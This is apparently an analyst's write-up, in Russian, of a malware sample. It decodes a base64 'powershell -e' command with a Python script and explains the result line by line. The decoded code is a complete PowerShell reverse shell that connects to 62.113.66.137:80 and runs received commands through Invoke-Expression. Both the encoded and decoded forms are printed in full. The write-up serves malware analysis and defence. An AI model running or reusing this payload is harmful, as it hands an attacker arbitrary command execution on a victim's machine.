# Base64 -> c2 Powershell

Скрин 1. 
```powershell
powershell -e JAB0AGMAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANgAyAC4AMQAxADMALgA2ADYALgAxADMANwAiACwAOAAwACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJAB0AGMAcAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7ACAAJAB3AHIAaQB0AGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7ACAAJAB3AHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7ACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAFIAZQBhAGQATABpAG4AZQAoACkAOwAgAGkAZgAoACQAYwBvAG0AbQBhAG4AZAApAHsAJABvAHUAdABwAHUAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGMAbwBtAG0AYQBuAGQAIAAyAD4AJgAxADsAIABpAGYAIAAoACQAbwB1AHQAcAB1AHQAIAAtAGkAcwAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBJAEUAbgB1AG0AZQByAGEAYgBsAGUAXQApACAAewAkAG8AdQB0AHAAdQB0ACAAPQAgACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwB9ADsAIAAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAkAG8AdQB0AHAAdQB0ACkAfQBlAGwAcwBlAHsAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBOAG8AIABjAG8AbQBtAGEAbgBkACAAcgBlAGMAZQBpAHYAZQBkACIAKQB9AH0AOwAgACQAcgBlAGEAZABlAHIALgBDAGwAbwBzAGUAKAApADsAIAAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwAgACQAdABjAHAALgBDAGwAbwBzAGUAKAApADsA

```


Данный семпл представляет собой закодированный в base64 текст, который расшифровывается при запуске(**powershell -e**).

Напишем небольшой скрипт на питоне, чтоб расшифровать нагрузку. 
Скрин 2.
``` python
import base64  
  
encoded_command = """  
JAB0AGMAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANgAyAC4AMQAxADMALgA2ADYALgAxADMANwAiACwAOAAwACkAOwAgACQAcwB0AHIAZQBhAG0AIAA9ACAAJAB0AGMAcAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7ACAAJAByAGUAYQBkAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7ACAAJAB3AHIAaQB0AGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7ACAAJAB3AHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7ACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkAewAkAGMAbwBtAG0AYQBuAGQAIAA9ACAAJAByAGUAYQBkAGUAcgAuAFIAZQBhAGQATABpAG4AZQAoACkAOwAgAGkAZgAoACQAYwBvAG0AbQBhAG4AZAApAHsAJABvAHUAdABwAHUAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAGMAbwBtAG0AYQBuAGQAIAAyAD4AJgAxADsAIABpAGYAIAAoACQAbwB1AHQAcAB1AHQAIAAtAGkAcwAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbABsAGUAYwB0AGkAbwBuAHMALgBJAEUAbgB1AG0AZQByAGEAYgBsAGUAXQApACAAewAkAG8AdQB0AHAAdQB0ACAAPQAgACQAbwB1AHQAcAB1AHQAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwB9ADsAIAAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAkAG8AdQB0AHAAdQB0ACkAfQBlAGwAcwBlAHsAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQBMAGkAbgBlACgAIgBOAG8AIABjAG8AbQBtAGEAbgBkACAAcgBlAGMAZQBpAHYAZQBkACIAKQB9AH0AOwAgACQAcgBlAGEAZABlAHIALgBDAGwAbwBzAGUAKAApADsAIAAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7ACAAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwAgACQAdABjAHAALgBDAGwAbwBzAGUAKAApADsA  
""".replace("\n", "").strip()  
  
decoded_bytes = base64.b64decode(encoded_command)  
decoded_command = decoded_bytes.decode('utf-16le').replace(";", ";\n")  
  
print("Расшифрованный PowerShell скрипт:")  
print("-----------------------------------")  
print(decoded_command)
```

Получаем раскодированный текст.
Скрин 3.
```powershell
 $tcp = New-Object System.Net.Sockets.TCPClient("62.113.66.137",80);
 $stream = $tcp.GetStream();
 $reader = New-Object System.IO.StreamReader($stream);
 $writer = New-Object System.IO.StreamWriter($stream);
 $writer.AutoFlush = $true;
 while($true){$command = $reader.ReadLine();
 if($command){$output = Invoke-Expression $command 2>&1;
 if ($output -is [System.Collections.IEnumerable]) {$output = $output | Out-String};
 $writer.WriteLine($output)}else{$writer.WriteLine("No command received")}};
 $reader.Close();
 $writer.Close();
 $stream.Close();
 $tcp.Close();

```

Данный код является реверс шеллом с возможностью выполнения произвольного кода на машине жертвы. 

Что делает код:
1) Создаёт TCP-клиент и подключается к серверу 62.113.66.137 по порту 80;
```powershell
$tcp = New-Object System.Net.Sockets.TCPClient("62.113.66.137",80);
```

2) Настраивает поток ввода-вывода: создаёт чтение и запись в сетевой поток;
```powershell
 $stream = $tcp.GetStream();
 $reader = New-Object System.IO.StreamReader($stream);
 $writer = New-Object System.IO.StreamWriter($stream);
 $writer.AutoFlush = $true;
```

3) В цикле
- Постоянно ждёт команду от удалённого сервера.
- Выполняет команду через Invoke-Expression(эквивалент eval()).
- Возвращает результат выполнения обратно на сервер.
Немного подредактируем отступы, чтоб было понятнее.
```powershell
while($true){
	$command = $reader.ReadLine();
	if($command){
		$output = Invoke-Expression $command 2>&1;
		if ($output -is [System.Collections.IEnumerable]) {
			$output = $output | Out-String
		};
		$writer.WriteLine($output)
	} else {
		$writer.WriteLine("No command received")
	}
};
```

4) И в самом конце - закрывает соединение. 
```powershell
 $reader.Close();
 $writer.Close();
 $stream.Close();
 $tcp.Close();
```
